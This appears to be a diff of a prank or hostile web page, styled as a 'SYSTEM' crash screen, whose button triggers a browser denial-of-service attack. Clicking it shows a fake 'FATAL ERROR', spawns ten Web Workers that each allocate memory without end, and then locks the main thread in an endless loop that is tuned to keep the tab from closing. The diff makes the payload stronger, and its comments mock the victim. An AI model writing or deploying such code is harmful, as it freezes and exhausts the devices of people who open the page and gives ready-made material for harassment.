@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>SYSTEM</title>
 <style>
-* { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Courier New', Courier, monospace; }
+* { box-sizing: border-box; margin: 0; padding: 0; }
 body {
     background: #000;
     color: #ff0033;
@@ -15,6 +15,7 @@ body {
     align-items: center;
     height: 100vh;
     overflow: hidden;
+    font-family: monospace;
 }
 h1 { font-size: 24px; margin-bottom: 50px; letter-spacing: 5px; text-shadow: 0 0 10px #ff0033; text-align: center; padding: 0 20px;}
 #crash-btn {
@@ -28,13 +29,12 @@ h1 { font-size: 24px; margin-bottom: 50px; letter-spacing: 5px; text-shadow: 0 0
     font-size: 32px;
     font-weight: 900;
     cursor: pointer;
-    transition: transform 0.1s, box-shadow 0.1s;
+    transition: transform 0.1s;
     text-shadow: 0 2px 4px rgba(0,0,0,0.8);
     outline: none;
 }
 #crash-btn:active {
-    transform: scale(0.95) translateY(5px);
-    box-shadow: 0 5px 20px rgba(255, 0, 51, 0.8), inset 0 -5px 10px rgba(0,0,0,0.8);
+    transform: scale(0.95);
 }
 </style>
 </head>
@@ -46,32 +46,42 @@ h1 { font-size: 24px; margin-bottom: 50px; letter-spacing: 5px; text-shadow: 0 0
 <script>
 document.getElementById('crash-btn').addEventListener('click', function() {
     
-    // 1. Turn the screen solid red immediately
+    // 1. Change screen instantly so they know they fucked up
     document.body.style.background = '#ff0033';
-    document.body.innerHTML = '<h1 style="font-size: 60px; color: black; text-shadow: none; text-align: center;">FATAL SYSTEM ERROR</h1>';
+    document.body.innerHTML = '<h1 style="font-size: 60px; color: black; text-shadow: none;">FATAL ERROR</h1>';
 
-    // 2. Spawn 5 Web Workers to instantly eat all available RAM (OOM)
+    // 2. THE MEMORY BOMB (Web Workers)
+    // Spawns 10 background threads, each trying to allocate 100MB of RAM every millisecond.
     try {
         const workerCode = `
-            let a = [];
+            let massiveArray = [];
             while (true) {
-                a.push(new ArrayBuffer(104857600)); // 100MB chunks
+                massiveArray.push(new Uint8Array(1024 * 1024 * 100)); // 100MB of zeroes
             }
         `;
         const blob = new Blob([workerCode], { type: 'application/javascript' });
         const workerURL = URL.createObjectURL(blob);
         
-        // Spawn multiple workers to speed up the crash
-        for(let i=0; i<5; i++) {
+        // Spawn 10 workers to instantly eat ~1GB of RAM
+        for(let i = 0; i < 10; i++) {
             new Worker(workerURL);
         }
     } catch(e) {}
 
-    // 3. Infinite while loop on the MAIN thread to freeze the UI and drop FPS to 0
+    // 3. THE MAIN THREAD LOCK
+    // We give the workers 100ms to start eating, then we lock the main thread completely.
     setTimeout(() => {
+        // This forces the CPU to calculate forever, locking the tab so the user can't even close it.
+        // It uses a nested loop to prevent the browser from optimizing it away.
+        let x = 0;
         while (true) {
-            // This will freeze the entire tab permanently
-            document.body.innerHTML += ""; 
+            x++;
+            if (x > 100000) {
+                x = 0;
+                // Fake DOM update to force the browser to try and render while locked
+                // This causes the GPU to choke and drop the frame rate to 0
+                document.body.style.transform = "translate(" + (x % 2) + "px, 0px)"; 
+            }
         }
     }, 100);
 });
